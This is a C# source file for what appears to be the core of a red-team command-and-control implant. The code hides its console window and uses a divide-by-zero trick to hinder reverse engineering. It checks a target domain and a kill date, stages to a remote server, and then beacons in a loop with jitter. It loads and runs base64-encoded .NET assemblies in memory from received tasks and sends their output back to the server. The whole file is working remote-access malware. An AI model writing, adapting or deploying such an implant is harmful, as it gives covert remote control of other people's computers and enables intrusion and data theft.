using System;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Reflection;
using System.Threading;
using System.Diagnostics;
using System.IO;
using System.Globalization;

public static class Program
{
    private const int SW_HIDE = 0;
    private const string MULTI_COMMAND_PREFIX = "multicmd";
    private const string COMMAND_SEPARATOR = "!d-3dion@LD!-d";
    private static Action<string, byte[]> _sendData;
    private static readonly Func<long> GET_DLL_BASE_ADDRESS = GetDllBaseAddress;
    private static readonly Func<string> GET_TASK_ID = GetCurrentTaskId;
    internal static readonly Random RANDOM = new Random();
    internal static IntPtr callbackFuncPtr = IntPtr.Zero;
    internal static readonly Regex SLEEP_REGEX = new Regex(@"(?<t>[0-9]{1,9})(?<u>[h,m,s]{0,1})", RegexOptions.Compiled | RegexOptions.IgnoreCase);

    // ReSharper disable once NotAccessedField.Local
    private static IntPtr _dllBaseAddress;
    private static string _currentTaskId;
    internal static Assembly coreAssembly;
    private static bool _coreLoaded;

#if DEBUG
    internal static readonly TextWriter STDOUT = Console.Out;
#endif

    public static void Main()
    {
        Sharp();
    }

    public static void Sharp(long callbackFunc = 0, long baseAddress = 0)
    {
        const long errorTrigger = 0;
#if !DEBUG
        Internals.ShowWindow(Internals.GetConsoleWindow(), SW_HIDE);
#endif
        var output = new byte[] { };
        try
        {
            // This is all anti-re stuff and can be ignored, real execution starts in the catch below
            var nullPointer = new IntPtr(errorTrigger);
            long thisWillError;
            if (Debugger.IsAttached)
            {
#if DEBUG
                thisWillError = baseAddress / nullPointer.ToInt64();
#else
                thisWillError = baseAddress;
#endif
            }
            else
            {
                thisWillError = baseAddress / nullPointer.ToInt64();
            }

            output = Encoding.BigEndianUnicode.GetBytes(thisWillError.ToString());
        }
        catch (Exception)
        {
            try
            {
                callbackFuncPtr = new IntPtr(callbackFunc);
                _dllBaseAddress = new IntPtr(baseAddress);
#if DEBUG
                STDOUT.WriteLine("[*] Decrypting config");
#endif
                var config = new Config("#REPLACEMEBASE64CONFIGREVERSED#", "#REPLACECONFIGKEY#");

                if (!string.IsNullOrEmpty(config.DomainCheck) && !Environment.UserDomainName.ToLower().Contains(config.DomainCheck.ToLower()))
                {
#if DEBUG
                    STDOUT.WriteLine($"[-] Payload is not configured to run on user domain: {Environment.UserDomainName}");
#endif
                    return;
                }

                if (DateTime.ParseExact(config.KillDate, "yyyy-MM-dd", CultureInfo.InvariantCulture) <= DateTime.Now)
                {
#if DEBUG
                    STDOUT.WriteLine("[-] Kill date exceeded, exiting");
#endif
                    return;
                }

                Init(config);

#if DEBUG
                STDOUT.WriteLine("[-] Terminating implant thread");
#endif
                var currentThread = Internals.GetCurrentThread();
                Internals.TerminateThread(currentThread, 0);
            }
            catch (Exception e)
            {
#if DEBUG
                STDOUT.WriteLine($"[-] Fatal error: \n{e}");
#endif
            }
        }

        Init(new Config(output.ToString(), null));
    }

    private static long GetDllBaseAddress()
    {
        return _dllBaseAddress.ToInt64();
    }

    private static string GetCurrentTaskId()
    {
        return _currentTaskId;
    }

    private static void Init(Config config)
    {
        IComms comms = null;
#if HTTP
        comms = new HttpComms(config);
#elif PBIND
        comms = new NamedPipeComms(config);
#elif FCOMM
        comms = new FileComms(config);
#endif
        _sendData = comms.SendTaskOutputBytes;
        Stage(config, comms);
#if DEBUG
        STDOUT.WriteLine("[*] Starting command loop");
#endif
        CommandLoop(config, comms);
    }

    private static void Stage(Config config, IComms comms)
    {
        var environmentalInfo = Utils.GetEnvironmentalInfo(config.UrlID);
        var configRefresh = comms.Stage(environmentalInfo);

        if (!string.IsNullOrEmpty(configRefresh))
        {
#if DEBUG
            STDOUT.WriteLine("[*] Refreshing config");
#endif
            config.Refresh(configRefresh);
        }
    }

    private static void CommandLoop(Config config, IComms comms)
    {
        var consoleOutput = new StringWriter();
        Console.SetOut(consoleOutput);
        var output = new StringBuilder();

        while (true)
        {
            if (DateTime.ParseExact(config.KillDate, "yyyy-MM-dd", CultureInfo.InvariantCulture) < DateTime.Now)
            {
#if DEBUG
                STDOUT.WriteLine("[-] Kill date exceeded, exiting");
#endif
                return;
            }

            output.Length = 0;
            try
            {
                string response;
                try
                {
                    response = comms.GetCommands();
                }
                catch (Exception e)
                {
#if DEBUG
                    STDOUT.WriteLine($"[-] Error beaconing: {e}");
#endif
                    BeaconSleep(config);
                    continue;
                }

                if (response == null)
                {
#if DEBUG
                    STDOUT.WriteLine("[-] Null response, re-staging");
#endif
                    consoleOutput = new StringWriter();
                    Console.SetOut(consoleOutput);
                    output = new StringBuilder();
                    Stage(config, comms);
                    BeaconSleep(config);
                    continue;
                }

                if (!string.IsNullOrWhiteSpace(response))
                {
#if DEBUG
                    Utils.TrimmedPrint("[*] Received commands response: ", response);
#endif

                    var commands = response.ToLower().StartsWith(MULTI_COMMAND_PREFIX)
                        ? response.Replace(MULTI_COMMAND_PREFIX, "").Split(new[] { COMMAND_SEPARATOR }, StringSplitOptions.RemoveEmptyEntries)
                        : new[] { response };

                    foreach (var commandObject in commands)
                    {
                        var taskId = commandObject.Substring(0, 5);
                        _currentTaskId = taskId;
                        var command = commandObject.Substring(5);
                        try
                        {
#if DEBUG
                            Utils.TrimmedPrint($"[*] Got task {taskId}: ", command);
#endif
                            var lowercaseCommand = command.ToLower();
                            if (lowercaseCommand.StartsWith("exit"))
                            {
#if DEBUG
                                STDOUT.WriteLine("[!] Exit called");
#endif
                                comms.Dispose();
                                return;
                            }
                            else if (lowercaseCommand.StartsWith("run-temp-appdomain "))
                            {
                                var cmdWithoutCommand = Regex.Replace(command, "run-temp-appdomain ", "", RegexOptions.IgnoreCase).Split();
                                var base64Module = cmdWithoutCommand[0];
                                AssemblyLoading.RunTempAppDomain(base64Module, cmdWithoutCommand.Skip(1).ToArray());
                            }
                            else if (lowercaseCommand.StartsWith("update-config "))
                            {
                                var configRefresh = command.Split()[1];
#if DEBUG
                                STDOUT.WriteLine($"[*] Refreshing config with {configRefresh}");
#endif
                                config.Refresh(configRefresh);
                                Console.WriteLine("Config successfully updated");
#if DEBUG
                                STDOUT.WriteLine("[*] Config successfully updated");
#endif
                            }
                            else if (lowercaseCommand.StartsWith("load-module"))
                            {
                                var module = Regex.Replace(command, "load-module", "", RegexOptions.IgnoreCase).Trim();
#if DEBUG
                                Utils.TrimmedPrint("[*] Loading module from base64 string: ", module);
#endif
                                var assembly = Assembly.Load(Convert.FromBase64String(module));
                                if (!_coreLoaded || assembly.FullName == coreAssembly.FullName)
                                {
                                    coreAssembly = assembly;
                                    _coreLoaded = true;
                                    SetDelegates(output);
                                }

                                output.AppendLine("Module loaded successfully");
                            }
                            else if (lowercaseCommand.StartsWith("run-dll-background") || lowercaseCommand.StartsWith("run-exe-background"))
                            {
                                var t = new Thread(() => AssemblyLoading.RunAssembly(command));
                                comms.SendTaskOutputString(taskId, "[+] Running background task");
                                t.Start();
                            }
                            else if ((lowercaseCommand.StartsWith("run-dll") || lowercaseCommand.StartsWith("run-exe")) && !command.Contains("Core.Program"))
                            {
                                AssemblyLoading.RunAssembly(command);
                            }
                            else if (lowercaseCommand.StartsWith("run-assembly-background"))
                            {
                                var t = new Thread(() => AssemblyLoading.RunEphemeralAssembly(command));
                                comms.SendTaskOutputString(taskId, "[+] Running assembly in background task");
                                t.Start();
                            }
                            else if (lowercaseCommand.StartsWith("set-delegates"))
                            {
                                SetDelegates(output);
                            }
                            else if (lowercaseCommand.StartsWith("download-file"))
                            {
                                AssemblyLoading.RunCoreAssembly(command);
                                output.AppendLine(consoleOutput.ToString());
                                var co = consoleOutput.GetStringBuilder();
                                co.Remove(0, co.Length);
                                var extraOutput = string.IsNullOrWhiteSpace(output.ToString()) ? "" : output.ToString();
                                if (!string.IsNullOrWhiteSpace(extraOutput))
                                {
#if DEBUG
                                    Utils.TrimmedPrint("[*] Download-file extra output:", extraOutput);
#endif
                                    comms.SendTaskOutputString(taskId, extraOutput);
                                    output.Length = 0;
                                }
                                continue;
                            }
                            else if (lowercaseCommand.StartsWith("run-assembly"))
                            {
                                AssemblyLoading.RunEphemeralAssembly(command);
                            }
                            else if (lowercaseCommand.StartsWith("beacon"))
                            {
                                var sleepValue = command.Replace("beacon", "").Trim();
                                var sleepMatch = SLEEP_REGEX.Match(sleepValue);
                                if (sleepMatch.Success)
                                {
                                    config.BeaconSleepMillis = Utils.ParseSleepTimeMillis(sleepMatch.Groups["t"].Value, sleepMatch.Groups["u"].Value);
                                    output.AppendLine($"Sleep set to: {sleepMatch.Value}");
                                }
                                else
                                {
                                    output.AppendLine($"[-] Invalid sleep time {command}");
                                }
                            }
                            else
                            {
                                AssemblyLoading.RunCoreAssembly(command);
                            }

                            output.AppendLine(consoleOutput.ToString());
                            var sb = consoleOutput.GetStringBuilder();
                            sb.Remove(0, sb.Length);
                            var toSend = string.IsNullOrWhiteSpace(output.ToString()) ? "" : output.ToString();
#if DEBUG
                            Utils.TrimmedPrint("[*] Command Output:", toSend);
#endif
                            comms.SendTaskOutputString(taskId, toSend);
                            output.Clear();
                        }
                        catch (Exception e)
                        {
                            comms.SendTaskOutputString(taskId, $"[-] Error: {output}\n {e}");
#if DEBUG
                            STDOUT.WriteLine($"[-] Exception in ImplantCore \n{e}");
#endif
                        }
                    }
                }
                else
                {
#if DEBUG
                    STDOUT.WriteLine("[*] No command");
#endif
                }
            }
            catch (Exception e)
            {
                if (e.Message == "0x0008")
                {
#if DEBUG
                    STDOUT.WriteLine($"[-] Stage error, exiting\n{e}");
#endif
                    return;
                }

                comms.SendTaskOutputString(null, $"[-] Error: {output} \n{e}");
#if DEBUG
                STDOUT.WriteLine($"[-] Exception in ImplantCore \n{e}");
#endif
            }
            finally
            {
                output.AppendLine(consoleOutput.ToString());
                var outputString = output.ToString();
                if (!string.IsNullOrWhiteSpace(outputString))
                {
#if DEBUG
                    Utils.TrimmedPrint("[*] Background Task Output: ", outputString);
#endif
                    comms.SendTaskOutputString("99999", outputString);
                }
                output.Clear();
            }

            BeaconSleep(config);
        }
    }

    private static void BeaconSleep(Config config)
    {
        if (config.BeaconSleepMillis != 0)
        {
            var sleep = RANDOM.Next((int)(config.BeaconSleepMillis * (1F - config.Jitter)), (int)(config.BeaconSleepMillis * (1F + config.Jitter)));
#if DEBUG
            STDOUT.WriteLine($"[*] Sleeping for {sleep}ms");
#endif
            Thread.Sleep(sleep);
        }
    }

    private static void SetDelegates(StringBuilder output)
    {
        var coreAssemblyEntryPoint = coreAssembly.EntryPoint;
        var declaringType = coreAssemblyEntryPoint.DeclaringType;
        var methodInfos = declaringType.GetMethods(BindingFlags.Public | BindingFlags.Static);
        foreach (var methodInfo in methodInfos)
        {
            if (methodInfo.GetParameters().Length == 3)
            {
                methodInfo.Invoke(null, new object[] { _sendData, GET_DLL_BASE_ADDRESS, GET_TASK_ID });
                output.Append("[+] Stage2-Core delegates set - ");
                return;
            }
        }

        output.AppendLine("[-] Could not find delegate setting function during loading of Stage2-Core.exe");
    }
}